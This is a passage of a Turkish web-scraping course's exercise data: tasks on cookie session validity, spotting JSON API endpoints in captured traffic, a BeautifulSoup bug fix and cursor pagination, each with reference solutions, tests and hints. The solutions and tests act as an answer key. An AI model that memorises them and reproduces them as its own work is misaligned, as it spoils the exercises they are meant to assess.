        tests: 'import json\nS = 1_730_000_000\nd = json.dumps({"cookies": [\n    {"name": "dil", "domain": "portal.example.com", "expires": S + 99999},\n    {"name": "oturum", "domain": ".example.com", "expires": S + 3600},\n    {"name": "oturum", "domain": "baska.com", "expires": -1}], "origins": []})\nassert oturum_gecerli(d, "portal.example.com", S), "Üst alan çerezi (.example.com) alt alanda geçerli, 1 saat var"\nassert not oturum_gecerli(d, "portal.example.com", S + 3500), "5 dakikalık paydan az kaldıysa yenile"\nassert not oturum_gecerli(d, "baska.com", S), "Tarayıcı oturumu çerezi (-1) yeni süreçte geçersiz"\nassert not oturum_gecerli(d, "evilexample.com", S), "evilexample.com, example.com\'un alt alanı değildir"\nassert not oturum_gecerli(json.dumps({"cookies": []}), "portal.example.com", S), "Çerez yoksa False"\n',
        hints: [
          'Çerez alanındaki baştaki noktayı lstrip(".") ile at.',
          'Alt alan kontrolü: alan == d or alan.endswith("." + d); yalnız endswith(d) evilexample.com\'u da kabul eder.',
          'Süre kontrolüne güvenlik payı ekle: işin ortasında oturum düşmesin.'
        ],
        why: 'Oturumu işin başında denetleyip yenilemek, iş yarıdayken giriş sayfasına yönlendirilip yanlış HTML kazımayı önler. Alan eşleştirmede nokta sınırına dikkat etmek ise tarayıcıların çerez kuralının aynısıdır.'
      },
      {
        t: 'code',
        id: 'web-scraping-y7',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p>Ağ trafiğinden gizli API\'yi bul: <code>api_adaylari(kayitlar)</code> yaz. <code>kayitlar</code> HAR benzeri sözlükler: <code>{"url", "method", "status", "content_type", "size"}</code>. JSON döndüren (<code>content_type</code> <code>application/json</code> ile başlayan), başarılı (200-299), <code>GET</code> isteklerini seç; sorgu parametreleri hariç yolu (<code>scheme://host/path</code>) anahtar yap ve aynı yoldan gelenleri birleştir. <code>(yol, cagri_sayisi, toplam_boyut)</code> listesini toplam boyuta göre azalan döndür.</p>',
        start: 'from urllib.parse import urlsplit\n\ndef api_adaylari(kayitlar):\n    pass\n',
        sol: 'from urllib.parse import urlsplit\n\ndef api_adaylari(kayitlar):\n    ozet = {}\n    for k in kayitlar:\n        if k["method"] != "GET" or not (200 <= k["status"] < 300):\n            continue\n        if not k.get("content_type", "").startswith("application/json"):\n            continue\n        p = urlsplit(k["url"])\n        yol = f"{p.scheme}://{p.netloc}{p.path}"\n        say, boyut = ozet.get(yol, (0, 0))\n        ozet[yol] = (say + 1, boyut + k["size"])\n    return sorted(((y, s, b) for y, (s, b) in ozet.items()), key=lambda t: -t[2])\n',
        tests: 'K = [\n {"url": "https://p.example.com/app.js", "method": "GET", "status": 200, "content_type": "application/javascript", "size": 90000},\n {"url": "https://p.example.com/api/v1/siparisler?sayfa=1", "method": "GET", "status": 200, "content_type": "application/json; charset=utf-8", "size": 4200},\n {"url": "https://p.example.com/api/v1/siparisler?sayfa=2", "method": "GET", "status": 200, "content_type": "application/json", "size": 3900},\n {"url": "https://p.example.com/api/v1/ozet", "method": "GET", "status": 200, "content_type": "application/json", "size": 600},\n {"url": "https://p.example.com/api/v1/izleme", "method": "POST", "status": 204, "content_type": "application/json", "size": 0},\n {"url": "https://p.example.com/api/v1/kampanya", "method": "GET", "status": 404, "content_type": "application/json", "size": 50}]\nassert api_adaylari(K) == [("https://p.example.com/api/v1/siparisler", 2, 8100), ("https://p.example.com/api/v1/ozet", 1, 600)], f"Gelen: {api_adaylari(K)}"\nassert api_adaylari([]) == [], "Boş trafik"\n',
        hints: ['Üç süzgeç: GET, 2xx, JSON içerik türü (charset eki olabilir: startswith).', 'urlsplit ile query\'yi at: scheme + netloc + path.', 'Sözlükte (sayı, boyut) biriktir, sonra boyuta göre azalan sırala.'],
        why: 'Sayfalanan bir listede aynı uç nokta farklı parametrelerle defalarca çağrılır; yola göre gruplayınca asıl veri kaynağı en büyük toplamla öne çıkar. Bu, Ağ sekmesinde elle yaptığın keşfin otomatik hâlidir.'
      },
      {
        t: 'code',
        id: 'web-scraping-y8',
        stage: 'Hata avı',
        kind: 'bug',
        diff: 2,
        q: '<p>Hatayı bul ve düzelt. <code>urunleri_oku(html)</code> her ürün kartından <code>(ad, fiyat)</code> çifti çıkarmalı; fiyatı olmayan (stokta yok) kartta fiyat <code>None</code> olmalı. Kod ilk fiyatsız kartta <code>AttributeError</code> veriyor; ayrıca <code>class</code> yerine <code>class_</code> kullanılması gereken yerde yanlış parametre var.</p>',
        start: 'from bs4 import BeautifulSoup\n\ndef urunleri_oku(html):\n    soup = BeautifulSoup(html, "html.parser")\n    sonuc = []\n    for kart in soup.find_all("div", {"class": "kart"}):\n        ad = kart.find("h3").text.strip()\n        fiyat = kart.find("span", cls="fiyat").text\n        sonuc.append((ad, float(fiyat.replace(",", "."))))\n    return sonuc\n',
        sol: 'from bs4 import BeautifulSoup\n\ndef urunleri_oku(html):\n    soup = BeautifulSoup(html, "html.parser")\n    sonuc = []\n    for kart in soup.find_all("div", class_="kart"):\n        ad = kart.find("h3").get_text(strip=True)\n        f = kart.find("span", class_="fiyat")\n        sonuc.append((ad, float(f.get_text(strip=True).replace(",", ".")) if f else None))\n    return sonuc\n',
        tests: 'H = """<div class="kart"><h3> Yoga Matı </h3><span class="eski">499,00</span><span class="fiyat">399,90</span></div>\n<div class="kart tukendi"><h3>Kamp Çadırı</h3><span class="etiket">Stokta yok</span></div>\n<div class="kart"><h3>Termos</h3><span class="fiyat"> 459,00 </span></div>"""\nassert urunleri_oku(H) == [("Yoga Matı", 399.9), ("Kamp Çadırı", None), ("Termos", 459.0)], f"Gelen: {urunleri_oku(H)}"\n',
        hints: [
          'cls diye bir parametre yok; BeautifulSoup bunu "cls" adlı öznitelik arar ve ilk span\'ı bile bulamaz.',
          'find bulamazsa None döner; .text çağırmadan önce denetle.',
          'f = kart.find("span", class_="fiyat"); ... if f else None'
        ],
        why: 'class_ BeautifulSoup\'un class özniteliği için ayrılmış adıdır; başka adlar öznitelik adı sayılır. find\'ın None döndürmesi ise kazımada en sık çöküş nedenidir: eksik alan normal bir durumdur ve koda yansıtılmalıdır.'
      },
      {
        t: 'code',
        id: 'web-scraping-y9',
        stage: 'Meydan okuma',
        diff: 3,
        q: '<p>Cursor tabanlı sayfalamayı yakalanan JSON üzerinde yürüt: <code>tumunu_cek(getir, sinir=100)</code> yaz. <code>getir(cursor)</code> bir sayfa döndürür: <code>{"items": [...], "next_cursor": str | None}</code>; ilk çağrı <code>cursor=None</code> ile. Tüm öğeleri sırayla topla, <code>id</code>\'si daha önce görülen öğeyi tekrar ekleme (sayfalar örtüşebilir). <code>next_cursor</code> <code>None</code> olunca dur. Aynı cursor ikinci kez gelirse (sonsuz döngü) ya da <code>sinir</code> sayfa aşılırsa <code>RuntimeError</code> fırlat.</p>',
        start: 'def tumunu_cek(getir, sinir=100):\n    return []\n',
        sol: 'def tumunu_cek(getir, sinir=100):\n    ogeler, gorulen_id, gorulen_cursor = [], set(), set()\n    cursor, sayfa = None, 0\n    while True:\n        sayfa += 1\n        if sayfa > sinir:\n            raise RuntimeError("sayfa sınırı aşıldı")\n        yanit = getir(cursor)\n        for o in yanit["items"]:\n            if o["id"] not in gorulen_id:\n                gorulen_id.add(o["id"])\n                ogeler.append(o)\n        cursor = yanit.get("next_cursor")\n        if cursor is None:\n            return ogeler\n        if cursor in gorulen_cursor:\n            raise RuntimeError("cursor tekrarlandı")\n        gorulen_cursor.add(cursor)\n',
        tests: 'SAYFALAR = {None: {"items": [{"id": 1}, {"id": 2}], "next_cursor": "c2"},\n            "c2": {"items": [{"id": 2}, {"id": 3}], "next_cursor": "c3"},\n            "c3": {"items": [{"id": 4}], "next_cursor": None}}\ncagrilar = []\ndef getir(c):\n    cagrilar.append(c)\n    return SAYFALAR[c]\nassert [o["id"] for o in tumunu_cek(getir)] == [1, 2, 3, 4], "Örtüşen id 2 bir kez eklenmeli"\nassert cagrilar == [None, "c2", "c3"], f"Üç sayfa çağrılmalı: {cagrilar}"\nDONGU = {None: {"items": [], "next_cursor": "a"}, "a": {"items": [{"id": 1}], "next_cursor": "b"}, "b": {"items": [], "next_cursor": "a"}}\ntry:\n    tumunu_cek(lambda c: DONGU[c])\n    assert False, "Tekrarlanan cursor RuntimeError vermeli"\nexcept RuntimeError:\n    pass\ntry:\n    tumunu_cek(lambda c: {"items": [], "next_cursor": str(int(c or 0) + 1)}, sinir=5)\n    assert False, "Sınır aşımı RuntimeError vermeli"\nexcept RuntimeError:\n    pass\n',
        hints: [
          'Üç küme/sayaç tut: görülen id\'ler, görülen cursor\'lar, sayfa sayısı.',
          'Döngü koşulunu next_cursor None olana kadar sürdür; her turda önce sınırı denetle.',
          'Tekrarlanan cursor sonsuz döngünün işaretidir; sessizce durmak yerine hata fırlat.'
        ],
        why: 'Gerçek API\'lerde sayfalar arası örtüşme (yeni kayıt eklenince kayma) ve hatalı cursor döngüleri olur. Tekilleştirme ve iki koruyucu (cursor tekrar kontrolü, sayfa sınırı), gece çalışan bir kazıyıcının sonsuza kadar asılı kalmasını önler.'
      }
    ],
    faq: [
      {
        q: 'Playwright mı, Selenium mu?',
        a: 'Yeni projelerde Playwright: otomatik bekleme, ağ yakalama, oturum dosyası, paralel bağlamlar ve codegen hazır gelir; kurulum tek komuttur. Selenium daha eski ve yaygındır, çok farklı tarayıcı ve dil desteği gereken kurumsal test altyapılarında hâlâ sık görülür.'
      }
    ]
  }
);
})(window);
